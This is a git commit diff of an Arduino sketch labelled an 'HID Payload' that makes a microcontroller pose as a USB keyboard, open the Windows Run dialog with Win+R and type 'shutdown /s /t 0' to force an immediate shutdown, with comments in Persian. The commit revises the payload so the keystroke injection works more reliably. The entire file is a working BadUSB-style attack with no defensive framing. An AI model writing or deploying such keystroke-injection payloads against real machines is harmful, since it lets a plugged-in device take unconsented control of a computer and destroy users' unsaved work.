91468e6fa1164f413a35cec1a0cd27aca5b3cf2f
mohsen akhavan <77884120+mohsenakhavan@users.noreply.github.com>
2025-01-31 11:26:25 +0330

    Update shutdown_windows.ino

--- sketches/shutdown_windows.ino
+++ sketches/shutdown_windows.ino
@@ -1,15 +1,16 @@
-// HID Payload 1: Shutdown Windows
-#include "Arduino.h"
-#include "USB.h"
-#include "USBHIDKeyboard.h"
-
+#include <USBHIDKeyboard.h>
 USBHIDKeyboard Keyboard;
 
 void setup() {
-    USB.begin();
-    Keyboard.begin();
-    delay(2000);
-    Keyboard.println("shutdown /s /t 0");
+  Keyboard.begin();
+  delay(3000);
+  // باز کردن Run Dialog (Win + R)
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+  // اجرای دستور Shutdown
+  Keyboard.println("shutdown /s /t 0");
 }
 
 void loop() {}
